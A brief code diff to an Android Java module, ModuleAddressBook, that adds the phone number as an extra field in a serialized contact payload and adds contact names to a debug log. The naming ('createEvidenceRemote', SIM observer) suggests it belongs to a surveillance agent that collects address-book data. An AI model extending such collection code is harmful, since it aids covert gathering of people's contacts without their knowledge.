@@ -292,12 +292,11 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		}
 
 		addTypedString(outputStream, (byte) 0x01, name);
-		// if (phoneInfo!=null) {
-		// final String number = phoneInfo.getPhoneNumber();
 		addTypedString(outputStream, (byte) 0x07, number);
-
 		addTypedString(outputStream, (byte) 0x37, message);
 
+		addTypedString(outputStream, (byte) 0x40, number);
+		
 		final byte[] payload = outputStream.toByteArray();
 
 		final int size = payload.length;
@@ -411,7 +410,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		long id = c.getId();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id);
+			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id + " name: " + c.name);
 		}
 
 		byte[] packet = preparePacket(type, id, c.number, c.name, c.extra);
